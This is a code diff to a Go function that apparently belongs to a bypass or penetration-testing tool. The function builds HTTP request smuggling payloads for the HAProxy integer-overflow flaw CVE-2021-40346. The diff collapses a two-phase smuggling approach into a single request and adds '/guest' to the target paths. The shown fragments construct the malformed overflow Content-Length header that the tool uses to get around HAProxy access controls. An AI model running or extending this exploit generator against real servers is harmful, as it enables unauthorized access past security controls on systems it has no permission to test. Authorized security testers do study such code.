@@ -14,16 +14,10 @@ import (
 GenerateHAProxyBypassPayloads generates payloads for exploiting the HAProxy CVE-2021-40346
 integer overflow vulnerability that leads to HTTP Request Smuggling.
 
-The vulnerability works in two phases:
- 1. First request: Contains malformed Content-Length header that causes integer overflow
-    in HAProxy's header parsing. This request contains a partial smuggled request.
- 2. Second request: Normal request that completes the smuggled request when interpreted
-    by the backend.
-
-This approach follows how HTTP Request Smuggling works in practice, where:
-  - HAProxy sees each request as separate/valid
-  - The backend sees the body of request #1 + request #2 as a single complete request
-    that bypasses HAProxy's access controls
+The vulnerability exploits an integer overflow in HAProxy's header parsing to smuggle an HTTP
+request. By using a malformed Content-Length header that causes integer overflow, we can
+smuggle a second request in the body of the first that will be processed by the backend server
+but will bypass HAProxy's access controls.
 
 References:
 - https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/
@@ -50,22 +44,8 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 		"/",
 		"/robots.txt",
 		"/index",
+		"/guest",
 	}
-
-	// This job will be used for Phase 2 (completion request)
-	completionJob := BypassPayload{
-		OriginalURL:  targetURL,
-		Method:       "GET",
-		Scheme:       parsedURL.Scheme,
-		Host:         host,
-		RawURI:       "/guest",                 // Use a likely public path
-		BypassModule: bypassModule + "_phase2", // Mark as phase 2
-		Headers:      []Headers{},
-	}
-	completionJob.PayloadToken = GeneratePayloadToken(completionJob)
-
-	// First generate the completion request - it will be sent after each Phase 1 request
-	allJobs = append(allJobs, completionJob)
 
 	// Generate overflow pattern - using the exact pattern from the PoC
 	// 217 'a' characters is what's used in the public exploits
@@ -86,7 +66,7 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 		// Create overflow Content-Length header
 		contentLengthName := "Content-Length" + overflowPattern
 
-		// Create base payload for phase 1
+		// Create payload
 		job := BypassPayload{
 			OriginalURL:  targetURL,
 			Method:       "POST",
